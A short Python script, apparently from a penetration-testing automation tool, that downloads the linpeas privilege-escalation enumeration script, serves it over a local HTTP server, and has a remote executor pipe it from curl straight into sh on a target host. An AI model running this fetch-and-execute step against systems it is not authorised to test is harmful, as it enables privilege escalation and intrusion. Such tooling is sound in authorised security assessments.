import http.server
import socketserver
import threading
import os
import subprocess
import time

PORT = 8080
def run_http_server(port, ip):
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
        httpd.serve_forever()
def run_linpeas(executor, options):
    subprocess.run("curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh", shell=True, text=True, check=True)
    subprocess.run(["chmod +x ./linpeas.sh"], shell=True, text=True, check=True)
    http_thread = threading.Thread(target=run_http_server, args=(PORT, executor.host))
    http_thread.daemon = True  
    http_thread.start()
    command = f"curl -s http://{executor.host}:{PORT}/linpeas.sh | sh"
    executor.execute_shell_command(command)


